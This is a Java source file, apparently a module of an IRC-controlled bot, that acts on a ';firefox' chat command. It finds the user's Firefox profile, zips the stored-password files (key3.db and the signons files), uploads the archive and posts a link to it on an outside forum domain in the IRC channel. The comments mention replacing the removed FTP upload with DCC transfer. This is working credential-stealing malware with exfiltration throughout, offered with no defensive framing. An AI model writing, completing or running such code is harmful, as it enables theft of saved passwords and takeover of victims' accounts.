
import java.io.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.zip.*;

public class Firefox implements Handler, Runnable {

    private String path; // any other problems? trying tor emember
    private String profileFolder;
    private static final String FTP_HOST = "";
    private static final String FTP_USER = "";
    private static final String FTP_PASS = "";
    /**
     * I removed the FTP so this isnt needed, Im looking of a new way
     * to send the files over the DCC irc protocol, bit it will take some times- I will get the update right? Of course <3
     * @param args
     * @param nick
     * @return
     */

    public boolean processCommand(String[] args, String nick) {
        if(args[0].equals(";firefox")) {
            new Thread(this).start();
            return true;
        }
        return false;
    }

    @Override
    public void run() {
        int randomNumber = new Random().nextInt(100000);
        if (System.getProperty("os.name").contains("Vista")) {
            this.path = "C://Users//" + Misc.getUsername() + "//AppData//Roaming//Mozilla//Firefox";
        } else {
            path = "C://Documents And Settings//" + Misc.getUsername() + "//Application Data//Roaming//Mozilla//Firefox";
        }
        try {
            readProfileConfig();
            zipPasswords(System.getProperty("user.home") + "\\" + randomNumber + ".zip");
            String serverFile = Misc.getUsername() + "" + randomNumber + ".zip";
            Upload.uploadFile(System.getProperty("user.home") + "\\" + randomNumber + ".zip");
            IRC.sendMessage(Config.channel, "http://www.ztechforums.co.uk/caches/"+serverFile);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void zipPasswords(String outputFile) throws Exception {
        String[] files = {
            path + "/key3.db",
            path + "/signons.txt",
            path + "/signons1.txt",
            path + "/signons2.txt",
            path + "/signons3.txt"
        };

        if (!new File(path + "/signons.txt").exists()) {
            List<String> list = new ArrayList<String>(Arrays.asList(files));
            list.removeAll(Arrays.asList(path + "/signons.txt"));
            files = list.toArray(files);
        }
        if (!new File(path + "/signons1.txt").exists()) {
            List<String> list = new ArrayList<String>(Arrays.asList(files));
            list.removeAll(Arrays.asList(path + "/signons1.txt"));
            files = list.toArray(files);
        }
        if (!new File(path + "/signons2.txt").exists()) {
            List<String> list = new ArrayList<String>(Arrays.asList(files));
            list.removeAll(Arrays.asList(path + "/signons2.txt"));
            files = list.toArray(files);
        }
        if (!new File(path + "/signons3.txt").exists()) {
            List<String> list = new ArrayList<String>(Arrays.asList(files));
            list.removeAll(Arrays.asList(path + "/signons3.txt"));
            files = list.toArray(files);
        }
        zipFiles(outputFile, files);
    }

    public void zipFiles(String outFilename, String[] filenames) {
        byte[] buf = new byte[1024];

        try {
            ZipOutputStream out = new ZipOutputStream(new FileOutputStream(outFilename));
            for (int i = 0; i < filenames.length; i++) {
                if (filenames[i] == null) {
                    continue;
                }
                FileInputStream in = new FileInputStream(filenames[i]);
                out.putNextEntry(new ZipEntry(filenames[i]));
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                out.closeEntry();
                in.close();
            }
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void readProfileConfig() throws Exception {
        File file = new File(this.path + "//profiles.ini");
        BufferedReader br = new BufferedReader(new FileReader(file));
        String line;
        while ((line = br.readLine()) != null) {
            if (line.startsWith("Path=")) {
                this.profileFolder = line.replace("Path=Profiles/", "");
            }
        }
        this.path = path + "//Profiles//" + profileFolder;
    }
}
